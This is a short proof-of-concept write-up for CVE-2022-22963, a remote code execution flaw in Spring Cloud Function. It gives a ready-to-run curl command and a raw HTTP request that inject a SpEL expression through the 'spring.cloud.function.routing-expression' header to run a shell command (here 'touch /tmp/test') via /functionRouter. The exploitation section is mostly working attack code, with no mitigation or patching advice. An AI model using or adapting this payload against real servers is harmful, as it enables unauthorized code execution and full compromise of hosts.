# Spring Cloud RCE vulnerability in Java application
HIGH vulnerability on the Spring Cloud Function leading to remote code execution (RCE). The vulnerability CVE-2022-22963 would allow attackers to execute arbitrary code on the machine and compromise the entire host.

### Is vulnerable?
If the application uses Spring Boot App (spring-cloud-function), it will most likely be vulnerable.

### Exploitation
This vulnerability allows using HTTP request header *spring.cloud.function.routing-expression* parameter and SpEL expression to be injected and executed through StandardEvalutionContext.

Curl command
```
curl -i -s -k -X $'POST' -H $'Host: 192.168.1.2:8080' -H $'spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec(\"touch /tmp/test")' --data-binary $'exploit_poc' $'http://192.168.1.2:8080/functionRouter'
```
#### OR

Using Burpsuite by modifying the request header
```
POST /functionRouter HTTP/1.1
Host: {target-ip}:{target-port}
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15/2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("touch /tmp/test")
Content-Length: 11

exploit-poc
```

### References
https://sysdig.com/blog/cve-2022-22963-spring-cloud/
